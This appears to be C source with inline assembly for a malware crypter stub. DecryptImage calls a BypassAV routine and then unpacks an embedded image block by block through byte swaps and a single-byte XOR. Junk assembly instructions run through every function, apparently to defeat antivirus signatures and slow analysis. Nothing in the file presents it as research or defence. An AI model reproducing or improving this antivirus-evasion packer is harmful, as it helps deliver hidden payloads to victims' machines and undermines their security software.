#include "crypt.h"

#define swap(x, y, T) do { T swap = x; x = y; y = swap; } while (0)

void DecryptImage(LPBYTE pImage, DWORD dwImageSize)
{
	BypassAV();

	DWORD nBlocks = dwImageSize / BLOCK_SIZE;
	for (size_t block = 0; block < nBlocks; block++)
	{
		__asm
		{
			push eax;
			xor eax, eax;
			jz True1;
			mov ecx, eax;
			and eax, 11;
			cld;
			or ecx, 2;
		True1:
			pop eax;
		}

		DecryptBlock(pImage);
		pImage += BLOCK_SIZE;

		__asm
		{
			push ecx;
			xor ecx, ecx;
			jz True2;
			and ecx, 12;
			push eax,
			cld;
		True2:
			pop ecx;
		}
	}
}

void DecryptBlock(LPBYTE pBlock)
{
	__asm nop;
	__asm mov al, al
	swap(pBlock[0], pBlock[1], BYTE);	/* two leftmost bytes */
	__asm push eax;
	__asm pop eax;
	swap(pBlock[6], pBlock[7], BYTE);	/* two rightmost bytes */
	__asm mov ebx, ebx;
	__asm test eax, eax;
	swap(pBlock[2], pBlock[5], BYTE);	/* bytes around two central bytes */
	__asm push eax;
	__asm xor eax, eax;
	__asm mov eax, 2;
	__asm shl eax, 1;
	__asm cmp eax, 4;
	__asm jz ok;
	ok: __asm pop eax;
	swap(pBlock[3], pBlock[4], BYTE);	/* two central bytes */
}

void XorBlock(LPBYTE pBlock, DWORD dwSize)
{
	unsigned char key = 0;
	/* dynamically generate key */
	for (int i = 0; i < 100; i++)
	{
		__asm mov eax, eax;
		__asm cmp eax, 0;

		if (i % 3 == 0)
			key += i;

		__asm test ebx, 1;
	}

	/* decrypt data */
	for (size_t i = 0; i < dwSize; i++)
	{
		__asm push eax;
		__asm mov eax, eax;
		__asm pop eax;

		pBlock[i] ^= key;

		__asm cmp eax, 0;
		__asm push eax;
		__asm pop eax;
	}
}
